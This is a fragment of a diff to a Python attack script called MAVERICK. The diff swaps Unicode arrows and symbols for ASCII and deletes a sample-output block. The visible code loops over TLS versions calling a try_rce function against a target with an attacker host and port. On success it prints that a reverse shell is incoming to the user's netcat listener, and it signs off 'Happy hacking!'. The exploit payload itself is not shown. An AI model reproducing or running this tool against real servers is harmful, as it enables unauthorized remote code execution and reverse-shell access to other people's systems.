@@ -86,31 +86,31 @@ def main():
             status, body = try_rce(args.target, args.lhost, args.lport, session)
 
             if status and status < 500:
-                print(f"  [+] {label} → SUCCESS! (HTTP {status})")
-                print(f"  [+] Check your netcat listener — shell incoming!")
+                print(f"  [+] {label} -> SUCCESS! (HTTP {status})")
+                print(f"  [+] Check your netcat listener - shell incoming!")
                 print(f"  [+] Server response: {body[:200]}")
-                print("\n[✓] MAVERICK done. Happy hacking!\n")
+                print("\n[V] MAVERICK done. Happy hacking!\n")
                 sys.exit(0)
             else:
-                print(f"  [-] {label} → Got HTTP {status}, not a clean hit.")
+                print(f"  [-] {label} -> Got HTTP {status}, not a clean hit.")
                 if i < total:
                     next_label = TLS_VERSIONS[i][0]
                     print(f"  [~] {label} not working, moving to {next_label}...")
 
         except ssl.SSLError as e:
-            print(f"  [-] {label} → SSL error: {e}")
+            print(f"  [-] {label} -> SSL error: {e}")
             if i < total:
                 next_label = TLS_VERSIONS[i][0]
                 print(f"  [~] {label} not working, moving to {next_label}...")
 
         except requests.exceptions.ConnectionError as e:
-            print(f"  [-] {label} → Connection error: {e}")
+            print(f"  [-] {label} -> Connection error: {e}")
             if i < total:
                 next_label = TLS_VERSIONS[i][0]
                 print(f"  [~] {label} not working, moving to {next_label}...")
 
         except Exception as e:
-            print(f"  [-] {label} → Unexpected error: {e}")
+            print(f"  [-] {label} -> Unexpected error: {e}")
             if i < total:
                 next_label = TLS_VERSIONS[i][0]
                 print(f"  [~] {label} not working, moving to {next_label}...")
@@ -121,16 +121,3 @@ def main():
 
 if __name__ == "__main__":
     main()
-```
-
-**Sample output will look like:**
-```
-[1/4] Trying TLSv1.3...
-  [-] TLSv1.3 → SSL error: ...
-  [~] TLSv1.3 not working, moving to TLSv1.2...
-
-[2/4] Trying TLSv1.2...
-  [+] TLSv1.2 → SUCCESS! (HTTP 200)
-  [+] Check your netcat listener — shell incoming!
-
-[✓] MAVERICK done. Happy hacking!
